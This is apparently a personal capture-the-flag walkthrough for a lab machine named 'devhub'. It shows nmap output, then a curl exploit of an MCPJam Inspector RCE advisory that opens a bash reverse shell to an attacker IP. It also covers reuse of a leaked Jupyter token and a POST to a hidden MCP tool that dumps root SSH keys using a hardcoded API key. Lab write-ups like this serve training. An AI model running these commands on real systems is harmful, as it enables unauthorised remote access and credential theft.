# devhub

```
Nmap scan report for 10.129.17.91
Host is up, received echo-reply ttl 63 (0.067s latency).
Scanned at 2026-06-04 22:02:24 EDT for 153s
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPWeIVAL8xAfqZkJzRocGOpKCgXQk807PgJQqBcvDCiTcyFYlXvFY0v+sI1XXnYKghVRDkCxYy23sjlFMceuifE=
|   256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDVyu6UXTR8XbXiFXOJx0xwUVCRheT9hT20o1VbEht
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Fri, 05 Jun 2026 02:04:34 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Fri, 05 Jun 2026 02:04:34 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Fri, 05 Jun 2026 02:04:35 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.99%I=7%D=6/4%Time=6A222EC0%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Fri,\x2005\x20Jun\x202026\x
SF:2002:04:34\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Fri,\x2005\x20Jun\x20
SF:2026\x2002:04:34\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Fri,\x2005\x20Jun\x202026\x2002:04:35\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

we found mcpjam through nmap, but it the webpage mentions it too. webpage also says there is a jupyter sever running locally, and references some internal git server.

use the [mcpjam rce](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6), (i also used this in [kobold](/htb/kobold.md)) and get your inital shell:

```bash
curl http://devhub.htb:6274/api/mcp/connect \
-H "Content-Type: application/json" \
-d '{"serverConfig":{"command":"bash","args":["-c","bash -i &> /dev/tcp/10.10.14.171/9001 0>&1"],"env":{}},"serverId":"pwn"}'
```

then add your ssh key because we're gonna be forwarding some ports

there is a jupyter-lab server running for analyst locally.

then there is what i presume to be an internal mcp server "opsmcp" running as root on port 5000. it requires an API key. the src is readable by analyst <- root privesc

idk where the git shit they are talking about is???

## jupyter

the token we need for jupyterlab is passed in as an arg to the command. you can also find it in the systemd unit file

then just go to the python console and do whatever the fuck. I just added my ssh key again to analyst user because idgaf

## opsmcp

this is the mcp server running as root, in there is a hidden endpoint for emergency dumping the root user's ssh key:

```python
# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
...
```

it also hardcodes the api key so we got that covered

we just have to POST some json like this and make it dump the root ssh key:

```bash
curl -XPOST -H "X-API-Key: $opsmcp_api_key" \
-H "Content-Type: application/json" \
-d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
https://localhost:5000/tools/call
```

![ssh key](/images/20260604_21h04m32s_grim.png)

![pwned](/images/20260604_21h07m45s_grim.png)




